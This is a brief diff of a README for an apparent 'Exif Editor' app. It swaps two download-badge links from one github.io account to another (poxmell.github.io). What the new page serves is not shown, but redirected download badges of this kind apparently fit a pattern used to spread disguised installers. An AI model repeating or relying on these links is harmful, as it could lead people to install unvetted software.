@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://a4-glent.github.io/.github/exifEditor">
+  <a href="https://poxmell.github.io/.github/exifEditor">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Exif Editor"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The privacy use case has grown significantly as awareness of image metadata risk
 
 <p align="center">
 
-[![Get it Now Exif Editor](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://a4-glent.github.io/.github/exifEditor)
+[![Get it Now Exif Editor](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/exifEditor)
 
 </p>
 
